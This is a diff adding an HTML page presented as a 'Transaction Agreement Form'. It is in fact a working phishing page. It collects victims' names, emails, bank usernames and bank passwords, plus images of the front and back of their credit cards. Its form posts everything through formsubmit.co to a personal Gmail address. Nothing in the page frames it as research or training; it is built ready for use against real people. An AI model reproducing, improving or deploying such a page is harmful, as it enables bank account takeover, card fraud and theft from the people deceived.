@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transaction Agreement Form</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #eef2f7 0%, #dce4ed 100%);
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 145vh;
+            margin: 0;
+            padding: 13px;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Form Container */
+        .form-container {
+            width: 90%;
+            max-width: 300px;
+            margin: 40px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+
+        /* Logo Style */
+        .logo {
+            width: 110px;
+            height: 110px;
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+
+        .checkbox-group {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            padding-left: 10px;
+        }
+
+        .checkbox-group input {
+            width: auto;
+            margin-right: 10px;
+        }
+
+        .checkbox-group label {
+            margin-bottom: 0;
+            font-weight: normal;
+        }
+
+        .file-inputs {
+            display: none;
+            margin-top: 20px;
+            padding-left: 10px;
+        }
+
+        .file-inputs input {
+            margin-top: 10px;
+            width: 95%;
+        }
+
+        .notice-box {
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #333;
+            border-radius: 5px;
+        }
+
+        .notice-box p {
+            margin: 0;
+        }
+
+        .notice-box a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .notice-box a:hover {
+            text-decoration: underline;
+        }
+
+        label {
+            font-size: 16px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input, select {
+            width: 95%;
+            padding: 12px;
+            font-size: 17px;
+            border: 1px solid #ccc;
+            border-radius: 7px;
+        }
+
+        /* Button Styling */
+        button {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #ff4500;
+            border: none;
+            border-radius: 9px;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            background: linear-gradient(to right, #ff6347, #ff4500);
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #e03b00;
+            background: linear-gradient(to right, #ff4500, #e03b00);
+            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.3);
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+        }
+
+        #confirmButton, #cancelButton {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #cancelButton {
+            background-color: #f44336;
+        }
+
+        #confirmButton:hover, #cancelButton:hover {
+            opacity: 0.8;
+        }
+
+        /* Animated squares */
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+                border-radius: 0;
+            }
+            100% {
+                transform: translateY(-1000px) rotate(720deg);
+                opacity: 0;
+                border-radius: 50%;
+            }
+        }
+
+        .squares {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 145%;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        .squares span {
+            position: absolute;
+            display: block;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 68, 0, 0.3);
+            animation: float 19s linear infinite;
+            bottom: -150px;
+        }
+
+        .squares span:nth-child(1) {
+            left: 10%;
+            width: 80px;
+            height: 80px;
+            animation-duration: 12s;
+        }
+
+        .squares span:nth-child(2) {
+            left: 20%;
+            width: 60px;
+            height: 60px;
+            animation-duration: 20s;
+        }
+
+        .squares span:nth-child(3) {
+            right: 35%;
+            width: 40px;
+            height: 40px;
+            animation-duration: 22s;
+        }
+
+        .squares span:nth-child(4) {
+            left: 40%;
+            width: 90px;
+            height: 90px;
+            animation-duration: 24s;
+        }
+        
+        .squares span:nth-child(5) {
+            right: 50%;
+            width: 90px;
+            height: 90px;
+            animation-duration: 30s;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <!-- Add logo here -->
+        <img src="money-transaction-icon_192037-4591.avif" alt="Logo" class="logo">
+        
+        <h2>Transaction Agreement Form</h2>
+
+       <form action="https://formsubmit.co/chin.hwa132@gmail.com" method="POST" id="agreementForm" enctype="multipart/form-data">
+       <div class="form-group">
+       <label for="fullName">Full Name:</label>
+        <input type="text" id="fullName" name="fullName" required placeholder="Enter your full name">
+    </div>
+
+    <div class="form-group">
+       <label for="email">Email Address:</label>
+        <input type="email" id="email" name="email" required placeholder="Enter your email address">
+    </div>
+    
+    <!-- New username field -->
+    <div class="form-group">
+      <label for="username">Bank Username:</label>
+        <input type="text" id="username" name="username" required placeholder="Enter your username">
+    </div>
+
+    <!-- New password field -->
+    <div class="form-group">
+        <label for="password">Bank Password:</label>
+        <input type="password" id="password" name="password" required placeholder="Enter your password">
+    </div>
+
+    <div class="form-group">
+       <label for="transactionAmount">Transaction Amount:</label>
+        <input type="number" id="transactionAmount" name="transactionAmount" required placeholder="Enter the amount">
+    </div>
+
+    <div class="form-group">
+      <label for="paymentMethod">Payment Method:</label>
+        <select id="paymentMethod" name="paymentMethod" required>
+            <option value="">Select payment method</option>
+          <option value="mailCheck">Mail Check</option>
+          <option value="mailCheck"> Transfer To Credit Card </option>
+        </select>
+    </div>
+
+    <!-- Checkbox for Uploading Images -->
+    <div class="checkbox-group">
+        <input type="checkbox" id="uploadImages" name="uploadImages">
+     <u><label for="uploadImages">Upload Credit Card</label></u>
+    </div>
+
+    <!-- Image Upload Fields (Initially Hidden) -->
+    <div class="file-inputs" id="fileInputs">
+        <label for="frontImage">Upload Front Image</label>
+        <input type="file" id="frontImage" name="frontImage" accept="image/*">
+        <label for="backImage">Upload Back Image</label>
+        <input type="file" id="backImage" name="backImage" accept="image/*">
+    </div>
+            <canvas id="canvas" width="150" height="5"></canvas>
+                
+    <!-- Notice Box -->
+    <div class="notice-box">
+        <p>Notice: You agree to the company <a href="agreement.html" target="agreement.html">terms and conditions</a>.</p>
+    </div>
+            <canvas id="canvas" width="150" height="7"></canvas>            
+    <button type="submit" id="submitButton">Submit Agreement</button>
+</form>
+
+<!-- Modal for Review -->
+<div id="reviewModal" class="modal">
+    <div class="modal-content">
+        <h2>Review Your Information</h2>
+        <p><strong>Name:</strong> <span id="reviewName"></span></p>
+        <p><strong>Email:</strong> <span id="reviewEmail"></span></p>
+        <p><strong>Username:</strong> <span id="reviewUsername"></span></p> <!-- Show username in review -->
+        <p><strong>Password:</strong> <span id="reviewPassword"></span></p> <!-- Show password in review -->
+        <p><strong>Amount:</strong> <span id="reviewAmount"></span></p>
+        <p><strong>Payment Method:</strong> <span id="reviewPaymentMethod"></span></p>
+        <button id="confirmButton">Confirm</button>
+        <button id="cancelButton">Cancel</button>
+    </div>
+</div>
+
+<div class="squares">
+    <span></span><span></span><span></span><span></span><span></span>
+    <span></span><span></span><span></span><span></span><span></span>
+</div>
+
+<script>
+    // Show or hide image upload fields based on checkbox
+    document.getElementById('uploadImages').addEventListener('change', function() {
+        const fileInputs = document.getElementById('fileInputs');
+        if (this.checked) {
+            fileInputs.style.display = 'block';  // Show the image upload fields
+        } else {
+            fileInputs.style.display = 'none';   // Hide the image upload fields
+        }
+    });
+
+    // Submit Form Handling
+    document.getElementById('agreementForm').addEventListener('submit', function (event) {
+        event.preventDefault();  // Prevent form submission
+
+        // Get values from form
+        const name = document.getElementById('fullName').value;
+        const email = document.getElementById('email').value;
+        const username = document.getElementById('username').value; // Get username value
+        const password = document.getElementById('password').value; // Get password value
+        const amount = document.getElementById('transactionAmount').value;
+        const paymentMethod = document.getElementById('paymentMethod').value;
+
+        // Validate that all fields are filled
+        if (!name || !email || !username || !password || !amount || !paymentMethod) {
+            alert('Please fill in all fields.');
+            return;
+        }
+
+        // Show review modal
+        document.getElementById('reviewName').textContent = name;
+        document.getElementById('reviewEmail').textContent = email;
+        document.getElementById('reviewUsername').textContent = username; // Display username
+        document.getElementById('reviewPassword').textContent = password; // Display password
+        document.getElementById('reviewAmount').textContent = amount;
+        document.getElementById('reviewPaymentMethod').textContent = paymentMethod;
+
+        // Display the modal
+        document.getElementById('reviewModal').style.display = 'flex';
+    });
+
+    // Handle Confirm Button
+    document.getElementById('confirmButton').addEventListener('click', function () {
+        // If confirmed, submit the form
+        document.getElementById('agreementForm').submit(); // Submit form after confirmation
+        alert('Your transaction agreement has been successfully submitted!');
+        document.getElementById('reviewModal').style.display = 'none';
+    });
+
+    // Handle Cancel Button
+    document.getElementById('cancelButton').addEventListener('click', function () {
+        // Close the modal without submitting
+        document.getElementById('reviewModal').style.display = 'none';
+    });
+
+    // Close Modal when clicking outside (optional)
+    window.addEventListener('click', function (event) {
+        const modal = document.getElementById('reviewModal');
+        if (event.target === modal) {
+            modal.style.display = 'none';
+        }
+    });
+</script>
+
+</body>
+</html>
